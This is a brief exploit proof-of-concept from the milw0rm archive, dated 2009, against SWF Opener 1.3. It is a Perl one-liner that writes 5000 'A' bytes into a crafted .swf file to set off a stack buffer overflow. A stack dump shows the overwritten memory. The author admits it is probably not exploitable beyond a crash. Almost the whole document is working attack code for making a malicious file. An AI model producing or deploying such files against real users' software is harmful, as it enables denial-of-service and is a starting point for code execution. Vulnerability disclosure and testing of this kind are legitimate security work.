# SWF Opener .swf Off By One / Underground Bof Poc
# Probably impossible to exploit, but who knows? -_- At least, there still exist Underground stack overflows in :d
# Version: 1.3
# http://www.browsertools.net/downloads/SWFOpenerSetup.exe
# usage perl poc.pl >>xpl.swf
# In The Stack
# 0012BBE8  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BBF0  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BBF8  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC00  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC08  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC10  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC18  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC20  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC28  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC30  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC38  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC40  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC48  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC50  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC58  41 41 41 41 41 41 41 41  AAAAAAAA
# 0012BC60  41 41 41 41 41 41 41 41  AAAAAAAA
#>>poc.pl
my $bof="\x41" x 5000;
print $bof;

# milw0rm.com [2009-04-09]
